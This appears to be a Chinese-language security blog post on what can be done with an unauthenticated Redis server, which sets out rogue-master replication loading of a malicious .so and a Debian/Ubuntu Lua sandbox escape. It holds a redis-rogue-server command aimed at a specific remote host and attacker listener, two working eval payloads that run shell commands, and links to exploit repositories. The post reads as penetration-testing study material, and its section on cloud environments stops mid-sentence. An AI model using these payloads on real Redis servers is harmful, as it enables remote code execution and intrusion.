---
title: 关于Redis未授权利用的一些思考
date: 2023-06-13 13:29:08
tags:
    - 漏洞跟踪
    - 开发工具
categories: Bugs
thumbnail: https://blog.dvkunion.cn/img/1484628369607.png

---

# Redis未授权利用的一些思考

<!-- split -->
> 一台未授权的redis，究竟能做些什么？
<!-- more -->

## 0x00 前言

问题如上。
其实真正遇到这个问题的时候我的第一反应也是没有当作一回事，毕竟redis未授权已经算得是和Top 10级别的漏洞一样耳熟能详的一个实战漏洞了，答案也是八股文张口就来：
1. 向web目录写入webshell
2. 通过写入authotrized_keys获取ssh登录权限
3. 通过crontab写入定时任务反弹shell

这几个选项是最常用的，也是最通用化的redis利用方式。基本上在目前的搜索引擎上能够获取到大量的文章，一般的面试以及普通的ctf靶场也通常会针对这几个考点来展开。但是实际上：

1. web路径未知，需要猜解或通过其他手段获取，或实际上在微服务分离的架构下redis服务器上不可能存在web服务，更有可能仅是一个redis容器。
2. redis主机没有暴露ssh端口，或根本不存在sshd服务，导致即使写入authotrized_keys，也无法实际利用。
3. 运行redis服务的账户权限极低，无法向/root/.ssh写入文件。
4. redis主机没有crontab服务

针对如上的限制，我们重新修改问题：

> 一台未授权且仅包含redis服务(容器化)，暴露的端口只有6379的redis容器，除了上述的几个方面，还能做些什么？

## 0x03 主从复制 远程.so加载

如果你足够细心和关注社区动态，那么在先知等平台

2019年7月7日，LC/BC的成员Pavel Toporkov在WCTF2019 Final分享会上介绍了Redis新版本的远程命令执行漏洞的利用方式。由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。

但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getsell了，在这种情况下，我们就需要其他的利用手段了。

此漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Redis 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。

简单的说，攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害人〈从机)上。

[exp](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

[代码仓库](https://github.com/LoRexxar/redis-rogue-server.git)

```python3
python3 redis-rogue-server.py --rhost 118.193.36.37 --rport 57048 --lhost 98.126.111.111 --lport 23333
```

## 0x04 Redis沙盒逃逸
Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。
Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。
我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls /tmp", "r"); local res = f:read("*a"); f:close(); return res' 0

## 0x05 考虑云场景下的环境
对于这种微服务架构、

## 结尾
[exploit](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
[vulhub](https://github.com/vulhub/vulhub/tree/master/redis)
[先知-redis利用](https://xz.aliyun.com/t/2295)
[404-主从复制](https://paper.seebug.org/975/)
[利用总结](https://sec-in.com/article/1309)
[github-exp](https://github.com/00theway/redis_exp)
[检测工具](https://github.com/Ridter/hackredis)
[其他](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)